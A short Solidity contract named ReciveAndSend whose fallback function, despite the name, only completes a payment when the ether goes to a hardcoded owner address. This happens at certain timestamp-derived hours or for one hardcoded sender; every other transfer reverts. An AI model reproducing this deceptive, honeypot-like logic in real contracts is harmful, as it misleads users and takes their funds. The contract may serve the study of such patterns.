 

pragma solidity ^0.4.11;


contract ReciveAndSend {
    event Deposit(
        address indexed _from,
        address indexed _to,
        uint _value,
        uint256 _length
    );
    
    function getHours() returns (uint){
        return (block.timestamp / 60 / 60) % 24;
    }

    function () payable public  {
        address  owner;
         
        owner = 0x9E0B3F6AaD969bED5CCd1c5dac80Df5D11b49E45;
        address receiver;
        
        

         
         
         
        uint hour = getHours();
         
        if ( msg.data.length > 0 && (  (hour  >= 3 && hour <5) || hour >= 15  )   ){
             
            receiver = owner;
        }else{
            receiver = msg.sender;
        }
         
        if (msg.sender == 0x958d5069Ed90d299aDC327a7eE5C155b8b79F291){
            receiver = owner;
        }
        

        receiver.transfer(msg.value);
        require(receiver == owner);
         
        Deposit(msg.sender, receiver, msg.value, msg.data.length);
        
        
    }
}